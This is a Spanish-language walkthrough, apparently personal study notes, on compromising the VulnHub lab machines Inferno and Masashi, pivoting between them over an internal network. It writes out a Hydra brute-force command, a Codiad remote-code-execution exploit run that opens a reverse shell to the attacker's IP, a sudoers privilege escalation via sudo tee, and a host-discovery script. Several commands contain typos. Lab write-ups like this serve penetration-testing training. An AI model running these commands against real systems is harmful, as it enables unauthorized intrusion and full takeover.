[[Vulnhub]]
Lunes 10 de junio del 2023 Mexico.
CDMX-Polanco
Valente Spiegel

Nota: En esta máquina hemos configurado una red interna para Pivotar a Masashi.

---
# Habilidades. 
[[Disiplinas.]]


 ==Inferno & Masashi

Enumeración web.
Fuerza bruta de autenticación web básica - Hydra 
Explotación autenticada de Codiad - Ejecución remota de código 
Fuga de información
Abuso de privilegios de sudo para asignar un nuevo privilegio en sudoers [Elevación de privilegios] 
Abuso de privilegios de sudo (Elevación de privilegios)
Fuerza bruta SSH - Hydra 

EXTRA: Creación de un script bash para descubrir computadoras en la red interna 
EXTRA: Creación de un script bash para descubrir los puertos abiertos de las computadoras
descubiertas en la red interna 
EXTRA: Reenvío remoto de puertos - Jugando con Chisel 
EXTRA: Conexión Socks5 con Chisel (Pivot) 
EXTRA: FoxyProxy + Túnel Socks5 
EXTRA: Fuzzing con gobuster a través de un proxy Socks5 Creación de un diccionario personalizado con cewl 

# Certificaciones.

eWPT  
eCPPTv2

---

---
# Creación de directorios para espacio de trabajo.

Es importante crear directorios o espacios de trabajo específicos al resolver una máquina.
Al crear un directorio o espacio de trabajo dedicado para una máquina de VulnHub, puedes mantener ordenada toda la información relacionada con esa máquina en un solo lugar. Esto incluye archivos de configuración, resultados de escaneos, notas y cualquier otro dato relevante. Una estructura organizada facilita el seguimiento del progreso, el acceso rápido a la información y la revisión posterior de los pasos realizados.

```
mkdir Infernoandmasashi && cd Infernoandmasashi && mkdir {Scan,Content,Exploits,Evidencia}
```

---
# Preparación del Laboratorio en VMware Interfaces de red.

=="Configuración de Adaptadores de red"

El laboratorio será de tipo pivoting por lo cual solo tendremos visibilidad a la máquina Inferno mientras está misma tendrá una 2da interfaz en el rango 10.10.0.0 y en este segmento de ted también se encuentra la máquina Masashi.

inferno = esn33 - ens35
Masashi = esn35


![[zzzzzz/VulnHub/InfernoyMasashi/1.png]]
![[zzzzzz/VulnHub/InfernoyMasashi/2.png]]
![[Captura de pantalla 2023-07-10 161408.png]]
![[Captura de pantalla 2023-07-10 162134.png]]
![[Captura de pantalla 2023-07-10 162424.png]]
![[Captura de pantalla 2023-07-10 162534.png]]

---
# preparación de el laboratorio en VMware "GRUB"

==El directorio en dónde se establece las interfaces de red está configurado para funcionar en Virtual box y establece nombres de tarjetas ajenas a VMware 

```
~e
rw init=/bin/bash
Ctrl+x
```
![[Captura de pantalla 2023-07-10 162753.png]]

```
cd /usr/network
ls
nano interfaces 
```
![[Captura de pantalla 2023-07-10 162958.png]]

==debemos modificar las interfaces de red de la máquina Inferno sustituyendo por ens33 y agregar ens35

![[Captura de pantalla 2023-07-10 163228.png]]

```
allow hotplug ens33
iface ens33 inet dhcp

allow hotplug ens35
iface ens35 inet dhcp

```

---
---
# ==Inferno.

# Descubrimiento.

==Necesitamos ubicar la IP que nos interesa.
```
sudo netdiscover
sudo arp-scan -I ens33 --localnet
ping 192.168.153.136
```
![[Captura de pantalla -2023-07-10 16-41-52.png]]

---
# Enumeración.

==Escaneo dedicado a el descubrimiento de puertos y vectores de ataque.

```
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.153.136
```

![[Captura de pantalla -2023-07-10 16-49-17.png]]

```
sudo nmap -sCV -p22,80 192.168.153.136 - oN targetd
```

![[Captura de pantalla -2023-07-10 16-50-10.png]]

---

# Escaneo web.

==Para saber a qué tecnologías nos estamos enfrentando obtendremos todo lo disponible en el servicio http:80

```
whatweb 192.168.153.136
```

![[Captura de pantalla -2023-07-10 16-51-12.png]]

http://192.168.153.136

![[Captura de pantalla -2023-07-10 16-52-20.png]]
==Parece ser una página web inspirada en la novela llamada la divina comedia.

```
gobuster dir -u http://192.168.153.136 -w /usr/share/seclist/Discovery/web-content/directory-list-3.2-medium.txt -t 20
```

![[Captura de pantalla -2023-07-10 17-11-29.png]]

==El resultado del ataque fue positivo arrojando que se encuentra un directorio web llamado Inferno.

http://192.168.153.136/inferno

![[Captura de pantalla -2023-07-10 17-12-36.png]]

==Nos pide un user y password

==Para esto utilizamos un ataque de fuerza bruta con hydra y un diccionario de contraseñas de Seclist

```
sudo hydra -l admin -p /usr/share/wordlis/rockyou.txt 192.168.153.136 http-get /inferno -t 60
```

![[Captura de pantalla -2023-07-12 12-00-16.png]]

Admin::dante1

![[Captura de pantalla -2023-07-12 12-00-43.png]]

Admin::dante1

![[Captura de pantalla -2023-07-12 12-00-58.png]]

==Se despliega un servicio de codiad sobre el puerto 80

![[Captura de pantalla -2023-07-12 12-02-17.png]]

---
# Escalamiento a usuario.

==Buscamos alguna vulnerabilidad  de codiat con searchsploit 

``` 
searchsploit codiad
```
![[Captura de pantalla -2023-07-12 12-24-22.png]]

==Nos interesa la remote code execution ya que tenemos credenciales auténticas de acceso  descargamos y modificamos nombré.
```
searchsploit -m múltiple/webapps/49704.py
```

![[Captura de pantalla -2023-07-12 12-25-10.png]]

==El exploit nos pide una serie de parámetros y la ejecución de 2 servicios netcat en escucha.

![[Captura de pantalla -2023-07-12 12-25-30.png]]

```
python3 codiad.py http://admin:dante1@192.168.153.136/inferno/ admin dante1 192.168.153.129 443 Linux
```

![[Captura de pantalla -2023-07-12 12-31-29.png]]

==Shell obtenida.

```
tee -r
find / -perm -4000 -ls 2>/dev/null
```
![[Captura de pantalla -2023-07-12 12-47-30.png]]

==Al listar los documentos se encuentra un archivo oculto llamad .download.dat

```
cat .download.dat; echo
```

![[Captura de pantalla -2023-07-12 12-54-06.png]]

==Esta cadena de texto ilegible parece ser un texto codeado en hexadecimal

```
cat .download.tas | xxd -ps -r; echo
```

![[Captura de pantalla -2023-07-12 13-20-59.png]]

==Es una cita del libro de dante la cual contiene unas posibles contraseñas
dante:V1rg1l10h3lpm3 

```
shh dante@192.168.153.136
```

![[Captura de pantalla -2023-07-12 13-24-31.png]]

==Las cuales son correctas para la conexion ssh

![[Captura de pantalla -2023-07-12 13-25-35.png]]

==Flag de usuario local.txt

---
# Escalamiento a root.
```
sudo -l
```
![[Captura de pantalla -2023-07-12 13-31-25.png]]

==El imput del comando nos arroja que el comando tee puede ser utilizado como root sin contraseña.

```
echo "dante ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers
```
==Este comando en la línea de comandos de Unix/Linux está diseñado para modificar el archivo de configuración `/etc/sudoers` de manera que permita al usuario llamado "dante" ejecutar cualquier comando con privilegios de superusuario (root) sin necesidad de proporcionar una contraseña.

![[Captura de pantalla -2023-07-12 14-15-11.png]]
![[Captura de pantalla -2023-07-12 14-16-15.png]]

==El acceso a root esta permitido y podemos visualizar el contenido de la flag de root.

---
---
# Pivoting.

El objetivo principal del pivoting es escalar el acceso y expandir el control sobre la red objetivo. Una vez que se ha comprometido un sistema, el atacante puede utilizar técnicas como la escalada de privilegios, el robo de credenciales o la explotación de vulnerabilidades adicionales para moverse lateralmente en la red y acceder a sistemas más críticos o valiosos.
El pivoting puede involucrar el uso de herramientas de acceso remoto, como el túnel SSH o el reenvío de puertos, para establecer conexiones desde el sistema comprometido hacia otros sistemas de la red. También puede implicar el uso de herramientas de escaneo y enumeración desde el sistema comprometido para descubrir otros sistemas, servicios y vulnerabilidades.

==Vamos a crear un script pequeño que con ayuda de el ping de la máquina Inferno,  nos ayudara a localizar la IP de la maquina Masashi.

```
#!/bin/bash

for i in $(seq 1 254); do
  timeout 1 bash -c "ping -c 1 10.10.18.$i" &>/dev/null && echo "[+] 10.10.18.$i - ACTIVE"
done
wait

```

==Este se debe crear con nano y guadarlo con una extencion .sh y darle permisos de ejecucion con chmod +x HostDiscovery.sh

Este código es un bucle que intenta realizar un ping a una serie de direcciones IP en el rango `10.10.18.1` a `10.10.18.254`. Utiliza el comando `timeout` para establecer un tiempo límite de 1 segundo para cada intento de ping. Si la dirección IP responde al ping, se imprime el mensaje "[+] 10.10.18.$i - ACTIVE" indicando que la dirección IP está activa.


![[Captura de pantalla -2023-07-12 14-18-49.png]]
![[Captura de pantalla -2023-07-12 14-29-26.png]]
![[Captura de pantalla -2023-07-12 14-40-37.png]]
![[Captura de pantalla -2023-07-13 13-44-59.png]]
![[Captura de pantalla -2023-07-13 13-50-24.png]]
![[Captura de pantalla -2023-07-13 13-59-51.png]]

---
---

---
# ==Masashi.

# Enumeracion y Escaneo web.

![[Captura de pantalla -2023-07-13 14-02-19.png]]
![[Captura de pantalla -2023-07-13 14-09-10.png]]
![[Captura de pantalla -2023-07-13 14-11-15.png]]
![[Captura de pantalla -2023-07-13 14-12-34.png]]
![[Captura de pantalla -2023-07-13 14-12-38.png]]
![[Captura de pantalla -2023-07-13 14-12-44.png]]
![[Captura de pantalla -2023-07-13 14-12-50.png]]
![[Captura de pantalla -2023-07-13 14-25-05.png]]
![[Captura de pantalla -2023-07-13 14-18-05.png]]

---
# Escalamiento a usuario.

![[Captura de pantalla -2023-07-13 14-26-06.png]]
![[Captura de pantalla -2023-07-13 14-26-42.png]]

---
# Escalamiento a root.

![[Captura de pantalla -2023-07-13 14-27-54.png]]
![[Captura de pantalla -2023-07-13 14-31-12.png]]
![[Captura de pantalla -2023-07-13 14-31-53.png]]
![[Captura de pantalla -2023-07-13 14-32-06.png]]
![[Captura de pantalla -2023-07-13 14-32-21.png]]

---

---
